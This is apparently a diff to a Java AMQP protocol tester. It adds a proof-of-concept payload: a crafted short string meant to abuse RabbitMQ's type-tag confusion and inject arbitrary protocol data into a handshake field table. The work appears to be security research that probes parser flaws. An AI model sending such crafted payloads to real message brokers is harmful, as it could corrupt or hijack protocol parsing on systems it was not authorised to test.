@@ -51,15 +51,32 @@ public class AMQPTesterDataTypes extends AMQPTester {
     //fieldArray.append(new ALongUInt(123));
     //fieldArray.append(new AShortUInt(321));
     //fieldArray.append(new AShortString("Array SS"));
-    fieldArray.append(new ALongString("Array LS"));
+    //fieldArray.append(new ALongString("Array LS"));
 
     //Encode data into the field-table
-    fieldTable.append(new AShortString("inner-FA"), fieldArray);
+    //fieldTable.append(new AShortString("inner-FA"), fieldArray);
     //fieldTable.append(new AShortString("inner-LS"), new ALongString("Field LS"));
     //fieldTable.append(new AShortString("inner-SS"), new AShortString("Field SS"));
     //fieldTable.append(new AShortString("inner-BOOL"), new ABoolean(false));
     //fieldTable.append(new AShortString("inner-LONG-UINT"), new ALongUInt(123));
     //fieldTable.append(new AShortString("inner-SHORT-UINT"), new AShortUInt(123));
+
+    //PoC - Encode a rogue short string with arbitrary data:
+    //RabbitMQ uses the encoding tag for short strings (lower case s) for 16 bits
+    //signed integers. This can (maybe?) be exploited to allow an attacker with
+    //access to any field/array encoded data set to inject arbitrary protocol data
+    try {
+      fieldTable.append(new AShortString("arbitrary"), new AShortString(ByteArrayBuffer.build(
+        new ByteArrayBuffer(new byte[]{14, 0x00}), //Short string length & first char, or 16 bit integer in RabbitMQ
+        new ByteArrayBuffer("S"), //Offset is now outside of the 16 bit integer, attempt to inject a long string
+        new ByteArrayBuffer(new byte[]{0x00, 0x00, 0x00, 0x08}), //Long string length
+        new ByteArrayBuffer("overflow") //Injected string contents
+      )));
+    } catch (InvalidTypeException e) {
+      System.err.println("Could not encode arbitrary short string: " + e.toString());
+    }
+
+    //Encode the field table (and all of the above) into the handshake
     server_props.put(new AShortString("inner-FT"), fieldTable);
 
     //Specially encoded UTF-8 testing bytes
